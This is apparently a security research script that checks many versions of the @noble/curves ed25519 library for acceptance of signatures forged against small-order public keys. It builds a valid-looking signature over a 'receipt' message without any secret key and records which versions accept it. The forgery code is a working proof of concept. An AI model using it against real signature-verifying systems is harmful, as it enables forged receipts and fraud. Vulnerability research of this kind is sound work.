// noble 全版本 × 3 个代表性挠点 裁决矩阵
import { verify as nodeVerify, createPublicKey } from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
const ROOT = '/home/z/my-project/research/small-order';
const VICTIMS = {
  'identity': '0100000000000000000000000000000000000000000000000000000000000000',
  'order2':   'ecffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff7f',
  'allzero':  '0000000000000000000000000000000000000000000000000000000000000000',
  'order4':   'c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac03fa',
};
const M = Buffer.from('arbitrary receipt forged without any secret');
const VERSIONS = ['1.0.0','1.1.0','1.2.0','1.3.0','1.4.0','1.4.1','1.4.2','1.5.0','1.6.0','1.7.0','1.8.0','1.9.0','1.9.7','2.0.0','2.0.1','2.2.0','2.3.0'];
console.log('version      identity order2 allzero order4');
const results = {};
for (const v of VERSIONS) {
  let dir = path.join(ROOT,'noble-versions',v,'node_modules','@noble','curves');
  if (!fs.existsSync(path.join(dir,'package.json')) && v==='1.4.2')
    dir = path.join(ROOT,'v1','node_modules','@noble','curves'); // 早前安装路径
  const pkg = fs.existsSync(path.join(dir,'package.json')) ? JSON.parse(fs.readFileSync(path.join(dir,'package.json'),'utf8')) : null;
  let ed;
  try { ed = (await import(path.join(dir,'ed25519.js'))).ed25519; }
  catch(e){ console.log(v.padEnd(12), 'IMPORT FAIL', e.message.slice(0,40)); continue; }
  const row = [];
  for (const [name,hex] of Object.entries(VICTIMS)) {
    const A = Buffer.from(hex,'hex');
    // 每版本独立生成 R,S（避免版本间 BASE 差异——点运算都是规范的，可共用）
    // 用该版本自己的曲线数学造 R=S·B
    let sig;
    try {
      const Pt = ed.Point ?? ed.ExtendedPoint;
      const B = Pt.BASE;
      const l = ed.CURVE?.n ?? 2n**252n + 27742317777372353535854737965820589843n;
      const S = (2n**250n + 1234567890123456789n) % l;
      const R = B.multiply(S);
      const Rb = typeof R.toRawBytes==='function'?R.toRawBytes():R.toBytes();
      const Sb = Buffer.alloc(32);{let s=S;for(let i=0;i<32;i++){Sb[i]=Number(s&0xffn);s>>=8n}}
      sig = Buffer.concat([Rb,Sb]);
    } catch(e){ row.push('GEN-ERR'); continue; }
    let v2;
    try { v2 = ed.verify(sig, M, A); } catch { v2 = false; }
    row.push(v2 ? '❌ACC' : '✅rej');
  }
  results[v]=row;
  console.log(v.padEnd(12), row.join('  '));
}
fs.writeFileSync('/tmp/noble-versions-results.json', JSON.stringify(results,null,1));
